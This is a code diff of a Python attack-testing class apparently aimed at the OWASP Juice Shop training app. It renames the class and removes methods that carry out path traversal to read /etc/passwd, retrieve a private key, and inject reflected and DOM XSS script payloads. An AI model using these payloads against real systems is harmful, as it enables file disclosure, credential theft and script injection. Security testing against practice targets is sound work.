@@ -2,7 +2,7 @@ import requests
 import logging
 
 
-class JuiceShopVulnerabilities:
+class CaptchaBypass:
     def __init__(self, base_url):
         self.base_url = base_url
         self.endpoints = {
@@ -86,60 +86,11 @@ class JuiceShopVulnerabilities:
 
         return {"status": "success" if any(r['status'] == "success" for r in results) else "failed", "details": results}
 
-    def test_path_traversal(self):
-        """Perform Path Traversal attack."""
-        payload = "../../../../etc/passwd"
-        response = requests.get(self.base_url + f"/ftp/{payload}")
-        if response.status_code == 200 and "root:" in response.text:
-            logging.info("[+] Path Traversal succeeded. Retrieved sensitive file content.")
-            return {"status": "success", "details": {"file_content": response.text}}
-        else:
-            logging.warning("[-] Path Traversal attack failed.")
-            return {"status": "failed", "details": "No sensitive files accessed."}
-
-    def test_sensitive_data_exposure(self):
-        """Test Sensitive Data Exposure."""
-        response = requests.get(self.base_url + self.endpoints["private_key"])
-        if response.status_code == 200:
-            logging.info("[+] Sensitive Data Exposure attack succeeded. Retrieved private key.")
-            return {"status": "success", "details": {"private_key": response.text}}
-        else:
-            logging.warning("[-] Sensitive Data Exposure attack failed.")
-            return {"status": "failed", "details": response.text}
-
-    def test_reflected_xss(self):
-        """Test Reflected XSS attack."""
-        payload = '<script>alert("xss")</script>'
-        data = {"search": payload}
-
-        response = requests.post(self.base_url + "/rest/products/search", json=data)
-        if payload in response.text:
-            logging.info("[+] Reflected XSS succeeded. Payload reflected in response.")
-            return {"status": "success", "details": {"payload": payload}}
-        else:
-            logging.warning("[-] Reflected XSS failed.")
-            return {"status": "failed", "details": "Payload not reflected in response."}
-
-    def test_dom_xss(self):
-        """Test DOM-based XSS attack."""
-        payload = "<script>alert('dom_xss')</script>"
-        response = requests.get(self.base_url + f"/#/?search={payload}")
-        if payload in response.text:
-            logging.info("[+] DOM XSS succeeded. Payload reflected in DOM.")
-            return {"status": "success", "details": {"payload": payload}}
-        else:
-            logging.warning("[-] DOM XSS failed.")
-            return {"status": "failed", "details": "Payload not reflected in DOM."}
-
     def run_all_attacks(self):
         """Run all attacks and return their results."""
         results = {
             "SQL Injection": self.test_sql_injection(),
             "CAPTCHA Bypass": self.test_captcha_bypass(),
-            "Path Traversal": self.test_path_traversal(),
-            "Sensitive Data Exposure": self.test_sensitive_data_exposure(),
-            "Reflected XSS": self.test_reflected_xss(),
-            "DOM XSS": self.test_dom_xss(),
         }
         return results
     
